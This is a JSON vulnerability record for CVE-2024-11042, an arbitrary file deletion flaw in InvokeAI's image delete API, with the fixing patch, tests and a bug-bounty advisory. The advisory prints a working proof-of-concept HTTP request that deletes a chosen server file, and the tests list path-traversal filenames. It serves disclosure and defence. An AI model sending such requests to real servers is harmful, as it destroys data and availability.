{
    "CVE-2024-11042": {
        "published_date": "2025-03-20T10:08:52.134Z",
        "patch_commits": [
            {
                "url": "https://github.com/invoke-ai/invokeai/commit/5440c037674882b2ab7acd59087e9bb04b49657a",
                "content": "fix(app): directory traversal when deleting images\n\nFilename: invokeai/app/services/image_files/image_files_disk.py:\n```\n@@ -110,15 +110,26 @@\ndef delete(self, image_name: str) -> None:\n         except Exception as e:\n             raise ImageFileDeleteException from e\n \n-    # TODO: make this a bit more flexible for e.g. cloud storage\n     def get_path(self, image_name: str, thumbnail: bool = False) -> Path:\n-        path = self.__output_folder / image_name\n+        base_folder = self.__thumbnails_folder if thumbnail else self.__output_folder\n+        filename = get_thumbnail_name(image_name) if thumbnail else image_name\n \n-        if thumbnail:\n-            thumbnail_name = get_thumbnail_name(image_name)\n-            path = self.__thumbnails_folder / thumbnail_name\n+        # Strip any path information from the filename\n+        basename = Path(filename).name\n+\n+        if basename != filename:\n+            raise ValueError(\"Invalid image name, potential directory traversal detected\")\n+\n+        image_path = base_folder / basename\n+\n+        # Ensure the image path is within the base folder to prevent directory traversal\n+        resolved_base = base_folder.resolve()\n+        resolved_image_path = image_path.resolve()\n+\n+        if not resolved_image_path.is_relative_to(resolved_base):\n+            raise ValueError(\"Image path outside outputs folder, potential directory traversal detected\")\n \n-        return path\n+        return resolved_image_path\n \n     def validate_path(self, path: Union[str, Path]) -> bool:\n         \"\"\"Validates the path given for an image or thumbnail.\"\"\"\n```\n\nFilename: tests/app/services/image_files/test_image_files_disk.py:\n```\n@@ -0,0 +1,51 @@\n+import platform\n+from pathlib import Path\n+\n+import pytest\n+\n+from invokeai.app.services.image_files.image_files_disk import DiskImageFileStorage\n+\n+\n+@pytest.fixture\n+def image_names() -> list[str]:\n+    # Determine the platform and return a path that matches its format\n+    if platform.system() == \"Windows\":\n+        return [\n+            # Relative paths\n+            \"folder\\\\evil.txt\",\n+            \"folder\\\\..\\\\evil.txt\",\n+            # Absolute paths\n+            \"\\\\folder\\\\evil.txt\",\n+            \"C:\\\\folder\\\\..\\\\evil.txt\",\n+        ]\n+    else:\n+        return [\n+            # Relative paths\n+            \"folder/evil.txt\",\n+            \"folder/../evil.txt\",\n+            # Absolute paths\n+            \"/folder/evil.txt\",\n+            \"/folder/../evil.txt\",\n+        ]\n+\n+\n+def test_directory_traversal_protection(tmp_path: Path, image_names: list[str]):\n+    \"\"\"Test that the image file storage prevents directory traversal attacks.\n+\n+    There are two safeguards in the `DiskImageFileStorage.get_path` method:\n+    1. Check if the image name contains any directory traversal characters\n+    2. Check if the resulting path is relative to the base folder\n+\n+    This test checks the first safeguard. I'd like to check the second but I cannot figure out a test case that would\n+    pass the first check but fail the second check.\n+    \"\"\"\n+    image_files_disk = DiskImageFileStorage(tmp_path)\n+    for name in image_names:\n+        with pytest.raises(ValueError, match=\"Invalid image name, potential directory traversal detected\"):\n+            image_files_disk.get_path(name)\n+\n+\n+def test_image_paths_relative_to_storage_dir(tmp_path: Path):\n+    image_files_disk = DiskImageFileStorage(tmp_path)\n+    path = image_files_disk.get_path(\"foo.png\")\n+    assert path.is_relative_to(tmp_path)\n```"
            }
        ],
        "sw_version": "v5.3.0rc2",
        "sw_version_wget": "https://github.com/invoke-ai/invokeai/archive/refs/tags/v5.3.0rc2.zip",
        "description": "In invoke-ai/invokeai version v5.0.2, the web API `POST /api/v1/images/delete` is vulnerable to Arbitrary File Deletion. This vulnerability allows unauthorized attackers to delete arbitrary files on the server, potentially including critical or sensitive system files such as SSH keys, SQLite databases, and configuration files. This can impact the integrity and availability of applications relying on these files.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/635535a7-c804-4789-ac3a-48d951263987",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nArbitrary File Delete via POST /api/v1/images/delete in invoke-ai/invokeai\nValid\nReported on Oct 1st 2024\nDescription\nInvokeAI is a leading creative engine for Stable Diffusion models, empowering professionals, artists, and enthusiasts to generate and create visual media using the latest AI-driven technologies. It implements many web APIs to manage models, files and images.\nIn the version v5.0.1, I find the web API POST /api/v1/images/delete is vulnerable to Arbitrary File Deletion, which can result an unauthorized attackers to delete arbitrary files they want.\nProof of Concept\nVictim Setup\nruns export INVOKEAI_HOST=\"0.0.0.0\" && invokeai-web to setup.\nAttack Step\nsends the following HTTP POST request to the web-ui to delete /tmp/hacked for demo:\nPOST http://192.168.3.153:9090/api/v1/images/delete HTTP/1.1\nHost: 192.168.3.153:9090\nAccept-Language: zh-CN\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36\nAccept: */*\nReferer: http://192.168.3.153:9090/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/json\nContent-Length: 31\n\n{\"image_names\":[\"/tmp/hacked\"]}\nImpact\nAny user can delete an arbitraty file on server. It is possible to delete critical/sensitive system files such as ssh key, sqlite database, configuration files etc. and thus impacts the integrity and availability of the applications running on top of these files.\nWe are processing your report and will contact theinvoke-ai/invokeai team within 24 hours.7 months ago\nWe were unable to make contact with the invoke-ai/invokeai team automatically, our community manager will try to reach out to them instead.7 months ago\nWe have sent a magic link to the invoke-ai/invokeai team via the email provided in their security policy7 months ago\nWe have sent a magic link to the invoke-ai/invokeai team via the email provided in their security policy7 months ago\nWe have sent a magic link to the invoke-ai/invokeai team via the email provided in their security policy7 months ago\nThis report has now been passed to internal triage and should be resolved within 14 days.6 months ago\nEthan Silvas validated this vulnerability6 months ago\nAble to reproduce, looks like this was fixed as well.\nzpbrenthas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-11042assigned to this report.6 months ago\nPeng Zhou\ncommented6 months ago\nResearcher\nHello, @ethansilvas. Yes, I found the maintainers have a patch at https://github.com/invoke-ai/InvokeAI/commit/5440c037674882b2ab7acd59087e9bb04b49657a committed on Oct. 18, 2024.\nPeng Zhou\ncommented6 months ago\nResearcher\nHere https://github.com/invoke-ai/InvokeAI/commit/5440c037674882b2ab7acd59087e9bb04b49657a\nA invoke-ai/invokeai maintainermarked this as fixedin 5.3.0with commit5440c05 months ago\nThe fix bounty has been dropped\nWe have sent a warning to the invoke-ai/invokeai team to inform them that this report will be published in 48 hours5 months ago\nWe have notified the invoke-ai/invokeai maintainers about this report in their weekly follow-up5 months ago\nThis vulnerability has now been published5 months ago\nCVE-2024-11042has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-11042\n(Published)\nVulnerability Type\nCWE-20: Improper Input Validation\nSeverity\nCritical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\nv5.0.2\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$600\nFix Bounty\n$150\nFound by\nPeng Zhou\n@zpbrent\nLIGHTWEIGHT\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory contains an explicit proof of concept detailing the steps and the HTTP request to reproduce the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-20",
                "value": "CWE-20 Improper Input Validation"
            }
        ]
    }
}